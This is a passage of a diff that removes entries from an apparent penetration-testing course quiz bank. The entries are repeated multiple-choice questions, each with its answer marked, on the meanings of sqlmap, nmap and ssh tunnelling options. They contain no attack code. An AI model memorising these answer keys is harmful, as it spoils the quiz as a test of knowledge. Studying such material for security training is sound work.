-      "C": "Force HTTP method to POST",
-      "D": "Send parameters in the request body"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 209,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--data`:",
-    "options": {
-      "A": "List columns for a table (requires -D and -T)",
-      "B": "Check if current user is DBA",
-      "C": "Send parameters in the request body",
-      "D": "List database names"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 210,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--cookie`:",
-    "options": {
-      "A": "Dump table data",
-      "B": "Send session cookies",
-      "C": "Force HTTP method to POST",
-      "D": "Send parameters in the request body"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 211,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--referer`:",
-    "options": {
-      "A": "List columns for a table (requires -D and -T)",
-      "B": "Retrieve current DB user",
-      "C": "Send session cookies",
-      "D": "Set HTTP referer header"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 212,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sn`:",
-    "options": {
-      "A": "OS detection",
-      "B": "Host discovery only (no port scan)",
-      "C": "SYN scan (default when root)",
-      "D": "Idle/Zombie scan"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 213,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-n`:",
-    "options": {
-      "A": "No DNS resolution",
-      "B": "TCP connect scan (used for pivoting/proxy)",
-      "C": "SYN scan (default when root)",
-      "D": "Host discovery only (no port scan)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 214,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-PP`:",
-    "options": {
-      "A": "ICMP timestamp request discovery",
-      "B": "XMAS scan (FIN/PSH/URG)",
-      "C": "TCP connect scan (used for pivoting/proxy)",
-      "D": "Idle/Zombie scan"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 215,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sS`:",
-    "options": {
-      "A": "Idle/Zombie scan",
-      "B": "SYN scan (default when root)",
-      "C": "Host discovery only (no port scan)",
-      "D": "No DNS resolution"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 216,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sT`:",
-    "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "Treat host as up (skip ping)",
-      "C": "Aggressive (-sV, -O, scripts, traceroute)",
-      "D": "SYN scan (default when root)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 217,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sX`:",
-    "options": {
-      "A": "Service version detection",
-      "B": "XMAS scan (FIN/PSH/URG)",
-      "C": "SYN scan (default when root)",
-      "D": "OS detection"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 218,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sV`:",
-    "options": {
-      "A": "Service version detection",
-      "B": "Idle/Zombie scan",
-      "C": "No DNS resolution",
-      "D": "SYN scan (default when root)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 219,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-O`:",
-    "options": {
-      "A": "No DNS resolution",
-      "B": "Service version detection",
-      "C": "XMAS scan (FIN/PSH/URG)",
-      "D": "OS detection"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 220,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-A`:",
-    "options": {
-      "A": "ICMP timestamp request discovery",
-      "B": "OS detection",
-      "C": "Host discovery only (no port scan)",
-      "D": "Aggressive (-sV, -O, scripts, traceroute)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 221,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sI`:",
-    "options": {
-      "A": "Host discovery only (no port scan)",
-      "B": "Idle/Zombie scan",
-      "C": "SYN scan (default when root)",
-      "D": "XMAS scan (FIN/PSH/URG)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 222,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-Pn`:",
-    "options": {
-      "A": "Treat host as up (skip ping)",
-      "B": "SYN scan (default when root)",
-      "C": "ICMP timestamp request discovery",
-      "D": "Host discovery only (no port scan)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 223,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-f`:",
-    "options": {
-      "A": "Local port forwarding",
-      "B": "Fork to background after auth (run in background)",
-      "C": "Disable pseudo-TTY allocation",
-      "D": "Remote port forwarding"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 224,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-N`:",
-    "options": {
-      "A": "Remote port forwarding",
-      "B": "Do not execute remote command (tunnel only)",
-      "C": "Fork to background after auth (run in background)",
-      "D": "Local port forwarding"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 225,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-T`:",
-    "options": {
-      "A": "Local port forwarding",
-      "B": "Fork to background after auth (run in background)",
-      "C": "Disable pseudo-TTY allocation",
-      "D": "Dynamic port forwarding (SOCKS proxy)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 226,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-R`:",
-    "options": {
-      "A": "Fork to background after auth (run in background)",
-      "B": "Remote port forwarding",
-      "C": "Do not execute remote command (tunnel only)",
-      "D": "Dynamic port forwarding (SOCKS proxy)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 227,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-L`:",
-    "options": {
-      "A": "Fork to background after auth (run in background)",
-      "B": "Local port forwarding",
-      "C": "Do not execute remote command (tunnel only)",
-      "D": "Dynamic port forwarding (SOCKS proxy)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 228,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-D`:",
-    "options": {
-      "A": "Dynamic port forwarding (SOCKS proxy)",
-      "B": "Remote port forwarding",
-      "C": "Local port forwarding",
-      "D": "Disable pseudo-TTY allocation"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 229,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--dbs`:",
-    "options": {
-      "A": "Force HTTP method to POST",
-      "B": "Set HTTP referer header",
-      "C": "Dump table data",
-      "D": "List database names"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 230,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--dump`:",
-    "options": {
-      "A": "Send parameters in the request body",
-      "B": "Set HTTP referer header",
-      "C": "Retrieve current DB user",
-      "D": "Dump table data"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 231,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--current-user`:",
-    "options": {
-      "A": "Send parameters in the request body",
-      "B": "Dump table data",
-      "C": "Retrieve current DB user",
-      "D": "List database names"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 232,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--is-dba`:",
-    "options": {
-      "A": "List database names",
-      "B": "Send session cookies",
-      "C": "Check if current user is DBA",
-      "D": "Dump table data"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 233,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--tables`:",
-    "options": {
-      "A": "Send session cookies",
-      "B": "Set HTTP referer header",
-      "C": "List database names",
-      "D": "List tables for a DB (requires -D)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 234,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--columns`:",
-    "options": {
-      "A": "Retrieve current DB user",
-      "B": "Set HTTP referer header",
-      "C": "List columns for a table (requires -D and -T)",
-      "D": "List tables for a DB (requires -D)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 235,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--method=POST`:",
-    "options": {
-      "A": "Send parameters in the request body",
-      "B": "Dump table data",
-      "C": "Force HTTP method to POST",
-      "D": "Check if current user is DBA"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 236,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--data`:",
-    "options": {
-      "A": "Send parameters in the request body",
-      "B": "List database names",
-      "C": "List columns for a table (requires -D and -T)",
-      "D": "List tables for a DB (requires -D)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 237,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--cookie`:",
-    "options": {
-      "A": "List database names",
-      "B": "Dump table data",
-      "C": "Send session cookies",
-      "D": "Check if current user is DBA"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 238,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--referer`:",
-    "options": {
-      "A": "Check if current user is DBA",
-      "B": "Set HTTP referer header",
-      "C": "Send session cookies",
-      "D": "List tables for a DB (requires -D)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 239,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sn`:",
-    "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "Host discovery only (no port scan)",
-      "C": "Service version detection",
-      "D": "ICMP timestamp request discovery"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 240,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-n`:",
-    "options": {
-      "A": "No DNS resolution",
-      "B": "SYN scan (default when root)",
-      "C": "XMAS scan (FIN/PSH/URG)",
-      "D": "OS detection"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 241,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-PP`:",
-    "options": {
-      "A": "Host discovery only (no port scan)",
-      "B": "ICMP timestamp request discovery",
-      "C": "Idle/Zombie scan",
-      "D": "Treat host as up (skip ping)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 242,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sS`:",
-    "options": {
-      "A": "ICMP timestamp request discovery",
-      "B": "TCP connect scan (used for pivoting/proxy)",
-      "C": "SYN scan (default when root)",
-      "D": "Idle/Zombie scan"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 243,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sT`:",
-    "options": {
-      "A": "Service version detection",
-      "B": "XMAS scan (FIN/PSH/URG)",
-      "C": "TCP connect scan (used for pivoting/proxy)",
-      "D": "OS detection"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 244,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sX`:",
-    "options": {
-      "A": "Host discovery only (no port scan)",
-      "B": "Idle/Zombie scan",
-      "C": "Service version detection",
-      "D": "XMAS scan (FIN/PSH/URG)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 245,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sV`:",
-    "options": {
-      "A": "OS detection",
-      "B": "TCP connect scan (used for pivoting/proxy)",
-      "C": "Service version detection",
-      "D": "Idle/Zombie scan"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 246,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-O`:",
-    "options": {
-      "A": "XMAS scan (FIN/PSH/URG)",
-      "B": "Service version detection",
-      "C": "TCP connect scan (used for pivoting/proxy)",
-      "D": "OS detection"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 247,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-A`:",
-    "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "SYN scan (default when root)",
-      "C": "Aggressive (-sV, -O, scripts, traceroute)",
-      "D": "No DNS resolution"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 248,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sI`:",
-    "options": {
-      "A": "Idle/Zombie scan",
-      "B": "OS detection",
-      "C": "Aggressive (-sV, -O, scripts, traceroute)",
-      "D": "Service version detection"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 249,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-Pn`:",
-    "options": {
-      "A": "Service version detection",
-      "B": "Host discovery only (no port scan)",
-      "C": "Treat host as up (skip ping)",
-      "D": "ICMP timestamp request discovery"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 250,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-f`:",
-    "options": {
-      "A": "Do not execute remote command (tunnel only)",
-      "B": "Fork to background after auth (run in background)",
-      "C": "Dynamic port forwarding (SOCKS proxy)",
-      "D": "Remote port forwarding"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 251,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-N`:",
-    "options": {
-      "A": "Do not execute remote command (tunnel only)",
-      "B": "Remote port forwarding",
-      "C": "Dynamic port forwarding (SOCKS proxy)",
-      "D": "Fork to background after auth (run in background)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 252,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-T`:",
-    "options": {
-      "A": "Disable pseudo-TTY allocation",
-      "B": "Local port forwarding",
-      "C": "Remote port forwarding",
-      "D": "Do not execute remote command (tunnel only)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 253,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-R`:",
-    "options": {
-      "A": "Disable pseudo-TTY allocation",
-      "B": "Fork to background after auth (run in background)",
-      "C": "Remote port forwarding",
-      "D": "Local port forwarding"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 254,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-L`:",
-    "options": {
-      "A": "Local port forwarding",
-      "B": "Remote port forwarding",
-      "C": "Fork to background after auth (run in background)",
-      "D": "Disable pseudo-TTY allocation"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 255,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-D`:",
-    "options": {
-      "A": "Do not execute remote command (tunnel only)",
-      "B": "Fork to background after auth (run in background)",
-      "C": "Disable pseudo-TTY allocation",
-      "D": "Dynamic port forwarding (SOCKS proxy)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 256,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--dbs`:",
-    "options": {
-      "A": "Dump table data",
-      "B": "Set HTTP referer header",
       "C": "Check if current user is DBA",
       "D": "List database names"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 257,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--dump`:",
-    "options": {
-      "A": "Send parameters in the request body",
-      "B": "Dump table data",
-      "C": "List database names",
-      "D": "Check if current user is DBA"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 258,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--current-user`:",
-    "options": {
-      "A": "Set HTTP referer header",
-      "B": "List columns for a table (requires -D and -T)",
-      "C": "Retrieve current DB user",
-      "D": "List tables for a DB (requires -D)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 259,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--is-dba`:",
-    "options": {
-      "A": "Set HTTP referer header",
-      "B": "Retrieve current DB user",
-      "C": "Check if current user is DBA",
-      "D": "Send parameters in the request body"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 260,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--tables`:",
-    "options": {
-      "A": "List columns for a table (requires -D and -T)",
-      "B": "Check if current user is DBA",
-      "C": "List tables for a DB (requires -D)",
-      "D": "Force HTTP method to POST"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 261,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--columns`:",
-    "options": {
-      "A": "Dump table data",
-      "B": "List columns for a table (requires -D and -T)",
-      "C": "Send parameters in the request body",
-      "D": "Set HTTP referer header"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 262,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--method=POST`:",
-    "options": {
-      "A": "Dump table data",
-      "B": "List columns for a table (requires -D and -T)",
-      "C": "Send session cookies",
-      "D": "Force HTTP method to POST"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 263,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--data`:",
-    "options": {
-      "A": "Dump table data",
-      "B": "Force HTTP method to POST",
-      "C": "Retrieve current DB user",
-      "D": "Send parameters in the request body"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 264,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--cookie`:",
-    "options": {
-      "A": "Dump table data",
-      "B": "List tables for a DB (requires -D)",
-      "C": "Set HTTP referer header",
-      "D": "Send session cookies"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 265,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--referer`:",
-    "options": {
-      "A": "Set HTTP referer header",
-      "B": "List database names",
-      "C": "Force HTTP method to POST",
-      "D": "Retrieve current DB user"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 266,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sn`:",
-    "options": {
-      "A": "OS detection",
-      "B": "TCP connect scan (used for pivoting/proxy)",
-      "C": "Idle/Zombie scan",
-      "D": "Host discovery only (no port scan)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 267,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-n`:",
-    "options": {
-      "A": "SYN scan (default when root)",
-      "B": "TCP connect scan (used for pivoting/proxy)",
-      "C": "No DNS resolution",
-      "D": "Host discovery only (no port scan)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 268,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-PP`:",
-    "options": {
-      "A": "Aggressive (-sV, -O, scripts, traceroute)",
-      "B": "Idle/Zombie scan",
-      "C": "ICMP timestamp request discovery",
-      "D": "Service version detection"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 269,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sS`:",
-    "options": {
-      "A": "SYN scan (default when root)",
-      "B": "Host discovery only (no port scan)",
-      "C": "Idle/Zombie scan",
-      "D": "XMAS scan (FIN/PSH/URG)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 270,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sT`:",
-    "options": {
-      "A": "Treat host as up (skip ping)",
-      "B": "Idle/Zombie scan",
-      "C": "TCP connect scan (used for pivoting/proxy)",
-      "D": "ICMP timestamp request discovery"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 271,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sX`:",
-    "options": {
-      "A": "Treat host as up (skip ping)",
-      "B": "Host discovery only (no port scan)",
-      "C": "XMAS scan (FIN/PSH/URG)",
-      "D": "OS detection"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 272,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sV`:",
-    "options": {
-      "A": "ICMP timestamp request discovery",
-      "B": "No DNS resolution",
-      "C": "SYN scan (default when root)",
-      "D": "Service version detection"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 273,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-O`:",
-    "options": {
-      "A": "Service version detection",
-      "B": "OS detection",
-      "C": "No DNS resolution",
-      "D": "XMAS scan (FIN/PSH/URG)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 274,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-A`:",
-    "options": {
-      "A": "SYN scan (default when root)",
-      "B": "No DNS resolution",
-      "C": "Host discovery only (no port scan)",
-      "D": "Aggressive (-sV, -O, scripts, traceroute)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 275,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sI`:",
-    "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "Host discovery only (no port scan)",
-      "C": "ICMP timestamp request discovery",
-      "D": "Idle/Zombie scan"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 276,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-Pn`:",
-    "options": {
-      "A": "Aggressive (-sV, -O, scripts, traceroute)",
-      "B": "SYN scan (default when root)",
-      "C": "Host discovery only (no port scan)",
-      "D": "Treat host as up (skip ping)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 277,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-f`:",
-    "options": {
-      "A": "Do not execute remote command (tunnel only)",
-      "B": "Remote port forwarding",
-      "C": "Disable pseudo-TTY allocation",
-      "D": "Fork to background after auth (run in background)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 278,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-N`:",
-    "options": {
-      "A": "Remote port forwarding",
-      "B": "Dynamic port forwarding (SOCKS proxy)",
-      "C": "Disable pseudo-TTY allocation",
-      "D": "Do not execute remote command (tunnel only)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 279,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-T`:",
-    "options": {
-      "A": "Fork to background after auth (run in background)",
-      "B": "Local port forwarding",
-      "C": "Disable pseudo-TTY allocation",
-      "D": "Do not execute remote command (tunnel only)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 280,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-R`:",
-    "options": {
-      "A": "Remote port forwarding",
-      "B": "Do not execute remote command (tunnel only)",
-      "C": "Local port forwarding",
-      "D": "Fork to background after auth (run in background)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 281,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-L`:",
-    "options": {
-      "A": "Local port forwarding",
-      "B": "Remote port forwarding",
-      "C": "Fork to background after auth (run in background)",
-      "D": "Dynamic port forwarding (SOCKS proxy)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 282,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-D`:",
-    "options": {
-      "A": "Dynamic port forwarding (SOCKS proxy)",
-      "B": "Fork to background after auth (run in background)",
-      "C": "Do not execute remote command (tunnel only)",
-      "D": "Disable pseudo-TTY allocation"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 283,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--dbs`:",
-    "options": {
-      "A": "List database names",
-      "B": "Dump table data",
-      "C": "Force HTTP method to POST",
-      "D": "Set HTTP referer header"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 284,
-    "topic": "Lab3",
-    "multi": false,
